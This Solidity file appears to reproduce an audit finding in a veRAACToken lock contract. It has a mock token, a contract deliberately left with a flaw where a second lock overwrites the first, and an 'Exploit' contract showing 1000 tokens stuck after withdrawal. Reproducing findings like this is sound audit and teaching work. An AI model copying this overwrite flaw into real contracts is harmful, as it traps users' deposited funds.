// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum veRAACToken — H-25 (Pashov, 2025-05-06), finding 66366
    LockManager.createLock writes state.locks[user] = newLock on every call
    and still adds the amount to totalLocked. A second lock replaces the first
    record. withdraw() pays only the latest amount, so the first debit stays
    in the contract. Duration 0 makes the lock mature in the same transaction,
    which is the playground stand-in for the report's time.increase.
*/

contract MockToken {
    string public symbol = "RAAC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a;
        balanceOf[t] += a;
        return true;
    }
}

contract VeRAACToken {
    struct Lock {
        uint256 amount;
        uint256 start;
        uint256 end;
        bool exists;
    }

    struct LockState {
        mapping(address => Lock) locks;
        uint256 totalLocked;
    }

    string public constant FINDING = "66366";
    MockToken public raac;
    LockState internal _lockState;
    bool public guardSecondLock;

    event Withdrawn(address indexed user, uint256 amount);

    constructor(MockToken _raac, bool _guard) {
        raac = _raac;
        guardSecondLock = _guard;
    }

    function lock(uint256 amount, uint256 duration) external {
        if (guardSecondLock && _lockState.locks[msg.sender].amount != 0) revert("LockFound");
        raac.transferFrom(msg.sender, address(this), amount);
        createLock(msg.sender, amount, duration);
    }

    function createLock(address user, uint256 amount, uint256 duration) public returns (uint256 end) {
        uint256 start = block.timestamp;
        end = start + duration;
        Lock memory newLock = Lock({amount: amount, start: start, end: end, exists: true});
        _lockState.locks[user] = newLock; // @> VULN: replaces any existing lock instead of adding to it
        // FIX: if (_lockState.locks[user].amount != 0) revert LockFound();
        _lockState.totalLocked += amount; // @beat:total
    }

    function withdraw() external {
        Lock memory pos = _lockState.locks[msg.sender];
        require(pos.exists, "no lock");
        require(block.timestamp >= pos.end, "locked");
        uint256 amount = pos.amount;
        delete _lockState.locks[msg.sender];
        _lockState.totalLocked -= amount;
        raac.transfer(msg.sender, amount); // @beat:pay
        emit Withdrawn(msg.sender, amount);
    }

    function getLockPosition(address user) external view returns (Lock memory) {
        return _lockState.locks[user];
    }

    function totalLocked() external view returns (uint256) {
        return _lockState.totalLocked;
    }
}

contract Exploit {
    MockToken public raac;
    VeRAACToken public ve;
    uint256 public constant AMOUNT = 1000 ether;
    uint256 public stuck;
    uint256 public returnedAmount;
    uint256 public recorded;

    constructor() {
        raac = new MockToken(); // nonce 1
        ve = new VeRAACToken(raac, false); // nonce 2
    }

    function run() external {
        raac.mint(address(this), AMOUNT * 2);
        raac.approve(address(ve), AMOUNT * 2);
        ve.lock(AMOUNT, 0); // @beat:first
        recorded = ve.getLockPosition(address(this)).amount;
        ve.lock(AMOUNT, 0); // @beat:second
        require(ve.getLockPosition(address(this)).amount == AMOUNT, "only the latest lock is stored");
        require(raac.balanceOf(address(ve)) == AMOUNT * 2, "both debits landed");
        ve.withdraw();
        stuck = raac.balanceOf(address(ve)); // @beat:stuck
        returnedAmount = raac.balanceOf(address(this));
        require(stuck == AMOUNT, "1000 RAAC stuck");
        require(returnedAmount == AMOUNT, "withdraw paid one lock");
        require(recorded == AMOUNT, "first lock was recorded then replaced");
    }
}
